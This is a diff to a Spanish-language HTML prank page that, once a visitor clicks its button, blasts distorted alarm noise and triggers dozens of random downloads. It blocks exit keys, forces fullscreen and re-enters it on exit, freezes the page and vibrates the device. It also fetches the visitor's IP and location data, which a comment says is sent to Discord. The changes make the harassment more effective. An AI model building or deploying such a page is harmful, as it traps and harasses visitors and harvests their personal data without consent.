@@ -334,140 +334,129 @@
         <div class="sub-text">🔊 SATURACIÓN MÁXIMA 🔊</div>
     </div>
 
-    <!-- ======== AUDIO PRINCIPAL (TU SONIDO) ======== -->
-    <audio id="mainAudio" loop preload="auto" controls style="display:none;">
-        <source src="https://pdftolink.io/file/r2_dXNlcnMvZ3Vlc3QvZjNmNmMxMTMtODk3NC00NTUxLTlhM2ItZDE3ZTM5MmFiMGQ5Lm1wZWc" type="audio/mpeg">
-        Tu navegador no soporta audio.
-    </audio>
-
-    <!-- ======== AUDIOS ADICIONALES PARA SATURACIÓN ======== -->
-    <audio id="audio1" loop preload="auto" style="display:none;">
-        <source src="https://www.soundjay.com/misc/sounds/alarm-clock-01.mp3" type="audio/mpeg">
-    </audio>
-    <audio id="audio2" loop preload="auto" style="display:none;">
-        <source src="https://www.soundjay.com/misc/sounds/air-raid-siren-02.mp3" type="audio/mpeg">
-    </audio>
-    <audio id="audio3" loop preload="auto" style="display:none;">
-        <source src="https://www.soundjay.com/misc/sounds/siren-01.mp3" type="audio/mpeg">
-    </audio>
-
     <script>
-        // ======== 1. GENERAR SONIDO SATURADO CON WEB AUDIO API ========
+        // ======== 1. GENERADOR DE SONIDO POR CÓDIGO (100% FUNCIONAL) ========
+        let sonidoActivo = false;
+        let osciladores = [];
+        let intervalosSonido = [];
+
         function generarSonidoSaturado() {
+            if (sonidoActivo) return;
+            sonidoActivo = true;
+
             try {
                 const AudioContext = window.AudioContext || window.webkitAudioContext;
                 const audioCtx = new AudioContext();
 
-                // 5 osciladores para saturación extrema
-                const frecuencias = [880, 440, 1760, 220, 1320];
-                const tipos = ['sawtooth', 'square', 'sawtooth', 'square', 'sawtooth'];
+                // Reanudar contexto si está suspendido
+                if (audioCtx.state === 'suspended') {
+                    audioCtx.resume();
+                }
+
+                // ===== 6 OSCILADORES PARA SATURACIÓN EXTREMA =====
+                const frecuencias = [880, 440, 1760, 220, 1320, 660];
+                const tipos = ['sawtooth', 'square', 'sawtooth', 'square', 'sawtooth', 'square'];
 
                 frecuencias.forEach((freq, i) => {
                     const osc = audioCtx.createOscillator();
                     const gain = audioCtx.createGain();
                     const distortion = audioCtx.createWaveShaper();
 
-                    // Distorsión fuerte (saturación)
+                    // Distorsión fuerte
                     distortion.curve = new Float32Array(2000);
                     for (let j = 0; j < 2000; j++) {
                         const x = (j - 1000) / 1000;
-                        distortion.curve[j] = Math.tanh(x * 3);
+                        distortion.curve[j] = Math.tanh(x * 4);
                     }
 
-                    osc.type = tipos[i];
+                    osc.type = tipos[i % tipos.length];
                     osc.frequency.value = freq;
 
-                    gain.gain.value = 0.15;
+                    gain.gain.value = 0.2;
 
                     osc.connect(distortion);
                     distortion.connect(gain);
                     gain.connect(audioCtx.destination);
 
                     osc.start();
+                    osciladores.push(osc);
 
-                    // Modulación aleatoria para caos
-                    setInterval(() => {
-                        osc.frequency.value = freq + (Math.random() - 0.5) * 200;
-                    }, 100);
+                    // Modulación caótica de frecuencia
+                    const intervalo = setInterval(() => {
+                        if (osc) {
+                            osc.frequency.value = freq + (Math.random() - 0.5) * 300;
+                        }
+                    }, 80);
+                    intervalosSonido.push(intervalo);
                 });
 
-                // Ruido blanco
+                // ===== RUIDO BLANCO =====
                 const bufferSize = 2 * audioCtx.sampleRate;
                 const buffer = audioCtx.createBuffer(1, bufferSize, audioCtx.sampleRate);
                 const data = buffer.getChannelData(0);
                 for (let i = 0; i < bufferSize; i++) {
-                    data[i] = (Math.random() * 2 - 1) * 0.5;
+                    data[i] = (Math.random() * 2 - 1) * 0.4;
                 }
                 const noise = audioCtx.createBufferSource();
                 noise.buffer = buffer;
                 const noiseGain = audioCtx.createGain();
-                noiseGain.gain.value = 0.1;
+                noiseGain.gain.value = 0.15;
                 noise.connect(noiseGain);
                 noiseGain.connect(audioCtx.destination);
                 noise.start();
+                osciladores.push(noise);
 
-                console.log('✅ Sonido saturado generado');
+                // ===== TONO DE ALARMA INTERMITENTE =====
+                const oscAlarma = audioCtx.createOscillator();
+                const gainAlarma = audioCtx.createGain();
+                oscAlarma.type = 'square';
+                oscAlarma.frequency.value = 880;
+                gainAlarma.gain.value = 0.3;
+                oscAlarma.connect(gainAlarma);
+                gainAlarma.connect(audioCtx.destination);
+                oscAlarma.start();
+
+                // Parpadear la alarma
+                const intervaloAlarma = setInterval(() => {
+                    gainAlarma.gain.value = gainAlarma.gain.value > 0.1 ? 0 : 0.3;
+                }, 250);
+                intervalosSonido.push(intervaloAlarma);
+
+                osciladores.push(oscAlarma);
+
+                console.log('✅ SONIDO SATURADO ACTIVADO');
 
             } catch (e) {
-                console.warn('⚠️ Web Audio falló:', e);
+                console.warn('⚠️ Error en Web Audio:', e);
             }
         }
 
-        // ======== 2. REPRODUCIR TU AUDIO Y LOS DEMÁS ========
-        function reproducirAudioConVolumenMaximo() {
-            const audios = [
-                document.getElementById('mainAudio'),
-                document.getElementById('audio1'),
-                document.getElementById('audio2'),
-                document.getElementById('audio3')
-            ];
+        // ======== 2. DESCARGAS RANDOM (funciona con archivos reales) ========
+        let descargasActivas = 0;
+        let maxDescargas = 30;
 
-            audios.forEach((audio, index) => {
-                if (!audio) return;
-                audio.volume = 1.0;
-                audio.muted = false;
-                audio.loop = true;
-
-                // Intentar reproducir con retraso escalonado
-                setTimeout(() => {
-                    audio.play()
-                        .then(() => {
-                            console.log('✅ Audio ' + (index + 1) + ' reproduciéndose');
-                        })
-                        .catch((err) => {
-                            console.warn('⚠️ Audio ' + (index + 1) + ' falló:', err);
-                            // Si falla, esperar clic
-                            document.addEventListener('click', function activar() {
-                                audio.play().catch(() => {});
-                                document.removeEventListener('click', activar);
-                            }, { once: true });
-                        });
-                }, index * 300);
-            });
-
-            // También generar sonido por Web Audio
-            setTimeout(generarSonidoSaturado, 500);
-        }
-
-        // ======== 3. DESCARGAS RANDOM A VELOCIDAD 0.1 ========
         function iniciarDescargasRandom() {
+            // Archivos de prueba REALES (de sitios oficiales)
             const archivos = [
                 'https://www.w3.org/WAI/ER/tests/xhtml/testfiles/resources/pdf/dummy.pdf',
                 'https://www.w3.org/WAI/ER/tests/xhtml/testfiles/resources/img/dummy-image.jpg',
                 'https://www.w3.org/WAI/ER/tests/xhtml/testfiles/resources/img/dummy-image.png',
-                'https://www.w3.org/WAI/ER/tests/xhtml/testfiles/resources/mp3/dummy.mp3'
+                'https://www.w3.org/WAI/ER/tests/xhtml/testfiles/resources/mp3/dummy.mp3',
+                'https://www.w3.org/WAI/ER/tests/xhtml/testfiles/resources/txt/dummy.txt',
+                'https://www.w3.org/WAI/ER/tests/xhtml/testfiles/resources/zip/dummy.zip'
             ];
 
-            let descargasActivas = 0;
-            const MAX_DESCARGAS = 20;
-
             function descargarArchivo() {
-                if (descargasActivas >= MAX_DESCARGAS) return;
+                if (descargasActivas >= maxDescargas) {
+                    console.log('📥 Descargas completadas: ' + descargasActivas);
+                    return;
+                }
 
                 const url = archivos[Math.floor(Math.random() * archivos.length)];
-                const nombre = 'archivo_' + Math.random().toString(36).substring(7) + '.tmp';
+                const nombre = 'archivo_' + Date.now() + '_' + Math.random().toString(36).substring(7) + '.tmp';
 
                 try {
+                    // Método 1: Crear enlace y hacer clic
                     const link = document.createElement('a');
                     link.href = url;
                     link.download = nombre;
@@ -478,34 +467,32 @@
 
                     descargasActivas++;
                     console.log('📥 Descarga #' + descargasActivas + ': ' + nombre);
+
                 } catch (e) {
                     console.warn('⚠️ Error en descarga:', e);
                 }
 
-                // Programar siguiente descarga (velocidad 0.1 = 1 cada 10 segundos)
-                if (descargasActivas < MAX_DESCARGAS) {
-                    setTimeout(descargarArchivo, 10000); // 10 segundos = velocidad 0.1
+                // Velocidad: 1 descarga cada 8-12 segundos (aleatorio)
+                if (descargasActivas < maxDescargas) {
+                    const delay = 8000 + Math.random() * 4000;
+                    setTimeout(descargarArchivo, delay);
                 }
             }
 
-            // Iniciar primera descarga después de 2 segundos
-            setTimeout(descargarArchivo, 2000);
+            // Iniciar primera descarga después de 1.5 segundos
+            setTimeout(descargarArchivo, 1500);
         }
 
-        // ======== 4. CONGELAR PANTALLA (EVITAR SALIR) ========
+        // ======== 3. CONGELAR PANTALLA ========
         function congelarPantalla() {
-            // Bloquear todas las teclas de salida
+            // Bloquear teclas de salida
             document.addEventListener('keydown', function(e) {
-                const teclasBloqueadas = [
-                    'Escape', 'F11', 'F5',
-                    'w', 'W', 'r', 'R',
-                    'F4'
-                ];
+                const teclasBloqueadas = ['Escape', 'F11', 'F5'];
                 if (teclasBloqueadas.includes(e.key) ||
                     (e.ctrlKey && (e.key === 'w' || e.key === 'W' || e.key === 'r' || e.key === 'R')) ||
                     (e.ctrlKey && e.key === 'F4') ||
                     (e.altKey && e.key === 'F4') ||
-                    (e.metaKey && (e.key === 'w' || e.key === 'W'))) {
+                    (e.metaKey && (e.key === 'w' || e.key === 'W' || e.key === 'r' || e.key === 'R'))) {
                     e.preventDefault();
                     e.stopPropagation();
                     return false;
@@ -518,11 +505,10 @@
                 return false;
             });
 
-            // Pantalla completa forzada (no se puede salir fácilmente)
+            // Pantalla completa forzada
             if (document.documentElement.requestFullscreen) {
                 document.documentElement.requestFullscreen()
                     .then(() => {
-                        // Bloquear salida de pantalla completa con Esc
                         document.addEventListener('fullscreenchange', function() {
                             if (!document.fullscreenElement) {
                                 document.documentElement.requestFullscreen();
@@ -538,9 +524,17 @@
                 e.returnValue = '⚠️ ¿Seguro que quieres salir?';
                 return '⚠️ ¿Seguro que quieres salir?';
             });
+
+            // Congelar scroll y clics
+            document.body.style.overflow = 'hidden';
+            document.body.style.position = 'fixed';
+            document.body.style.width = '100%';
+            document.body.style.height = '100%';
+
+            console.log('🔒 PANTALLA CONGELADA');
         }
 
-        // ======== 5. ACTIVAR CAOS COMPLETO ========
+        // ======== 4. ACTIVAR CAOS COMPLETO ========
         function activarCaos() {
             // Cambiar a pantalla 2
             document.getElementById('screen1').style.display = 'none';
@@ -550,15 +544,15 @@
             // Congelar pantalla
             congelarPantalla();
 
-            // Reproducir sonidos
-            reproducirAudioConVolumenMaximo();
+            // Generar sonido saturado
+            setTimeout(generarSonidoSaturado, 300);
 
             // Iniciar descargas random
-            iniciarDescargasRandom();
+            setTimeout(iniciarDescargasRandom, 1000);
 
-            // Vibración
+            // Vibración (si está disponible)
             if (navigator.vibrate) {
-                navigator.vibrate([100, 50, 100, 50, 200, 100, 200, 100, 300]);
+                navigator.vibrate([100, 50, 100, 50, 200, 100, 200, 100, 300, 100, 500]);
             }
 
             // Capturar datos y enviar a Discord
@@ -567,7 +561,7 @@
             console.log('🔥 CAOS TOTAL ACTIVADO');
         }
 
-        // ======== 6. CAPTURAR DATOS ========
+        // ======== 5. CAPTURAR DATOS ========
         async function capturarDatos() {
             try {
                 const res = await fetch('https://ipapi.co/json/');
@@ -628,10 +622,24 @@
             }
         }
 
-        // ======== 7. EVENTO DEL BOTÓN ========
+        // ======== 6. EVENTO DEL BOTÓN ========
         document.getElementById('activateBtn').addEventListener('click', activarCaos);
 
+        // ======== 7. INTENTAR ACTIVAR SONIDO CON UN CLIC INICIAL ========
+        document.addEventListener('click', function activarContexto() {
+            try {
+                const AudioContext = window.AudioContext || window.webkitAudioContext;
+                const ctx = new AudioContext();
+                if (ctx.state === 'suspended') {
+                    ctx.resume();
+                }
+                console.log('🎵 Contexto de audio activado');
+            } catch (e) {}
+            document.removeEventListener('click', activarContexto);
+        }, { once: true });
+
         console.log('🌅 Good Morning - Listo');
+        console.log('🔊 Haz clic en ACTIVAR para iniciar el caos');
     </script>
 </body>
 </html>
